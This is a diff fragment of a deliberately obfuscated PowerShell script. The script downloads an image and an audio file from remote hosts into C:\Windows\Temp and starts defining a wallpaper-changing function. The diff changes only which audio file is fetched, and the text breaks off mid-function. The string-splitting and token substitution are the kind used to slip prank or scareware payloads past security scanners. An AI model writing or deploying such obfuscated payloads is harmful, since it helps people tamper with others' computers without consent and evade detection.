@@ -1,7 +1,7 @@
  (('JMjimg'+'Path=hpAC:9TBWindows9TBTemp9TBb.jpghpA
 J'+'MjaudioPath=hpAC:9TBWindows9TBTemp9TBa.wavhpA
 Invoke-WebRequest -Uri https://i1.sndcdn.com/artwor'+'ks-000015364470-671i8t-t500x500.jpg -OutFile JMjimgPath
-In'+'voke-WebRequest -Uri https://github.com/J'+'u'+'stincoding3/GoogleFormsSpammer/raw/main/Mario%20Oh%20No!.wav -OutFile JMjaudioPath
+In'+'voke-WebRequest -Uri https://github.com/J'+'u'+'stincoding3/GoogleFormsSpammer/raw/main/Captain%20Lou%20Albano%20%20-%20WGBS%20Philly%2057%20%EF%BC%82Just%20Say%20No%EF%BC%82%20Drugs%20PSA.wav -OutFile JMjaudioPath
 
 function Set-Wallpape'+'r {
   '+'  param (
